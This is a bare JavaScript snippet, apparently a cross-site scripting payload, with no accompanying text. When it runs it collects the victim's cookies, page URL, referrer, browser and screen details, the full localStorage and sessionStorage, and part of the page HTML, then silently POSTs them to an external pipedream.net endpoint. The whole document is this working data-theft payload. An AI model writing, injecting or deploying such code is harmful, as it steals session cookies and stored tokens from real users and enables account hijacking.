(function () {
  const data = {
    cookie: document.cookie,
    location: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height
    },
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    html: document.documentElement?.outerHTML?.slice(0, 1000),
    ts: new Date().toISOString(),
    id: Math.random().toString(36).substring(2)
  };

  fetch("https://eo4fnrj3kpuriz4.m.pipedream.net", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
})();
